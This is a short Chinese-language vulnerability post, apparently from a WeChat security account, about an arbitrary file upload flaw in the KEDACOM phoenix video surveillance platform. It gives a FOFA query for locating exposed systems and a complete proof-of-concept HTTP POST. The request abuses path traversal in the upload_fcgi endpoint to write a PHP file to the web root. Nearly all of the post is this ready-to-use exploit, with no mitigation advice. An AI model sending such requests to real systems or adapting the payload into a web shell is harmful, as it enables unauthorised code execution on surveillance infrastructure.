#  KEDACOM phoenix监控平台upload_fcgi任意文件上传漏洞   
清晨  摸鱼划水   2025-05-22 08:17  
  
FOFA  
```
app="KEDACOM-phoenix监控平台"
```  
  
POC  
```
# 文件上传路径：/xhtjwvbhuocviluz.php
POST /pmc-bin/upload_fcgi?uploadDir=../&uploadName=xhtjwvbhuocviluz.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1v98KI1jc9w1bG97
Pragma: no-cache
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36

----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="Filedata": filename="aaaa"
Content-Type: image/jpeg

<?php echo 'tcrffkbmvbsbhxgtvzpptttxblclckrf';@unlink(__file__);?>
----WebKitFormBoundary1v98KI1jc9w1bG97--
```  
  
漏洞来源：  
  
[【Web攻防】安服存活指南-记某次攻防演练文件上传绕过到内网遨游](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247489194&idx=1&sn=c4e9fc3b774a9851aaeafdfb6506a9bb&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qJ5apkMXic81S0ES2ic91ektrT1jBpJkl5so2tuhKiaxCLvB8lt0Qy69ZHc7GIqElESLhstwGffZNzhib7KUB4CdVA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
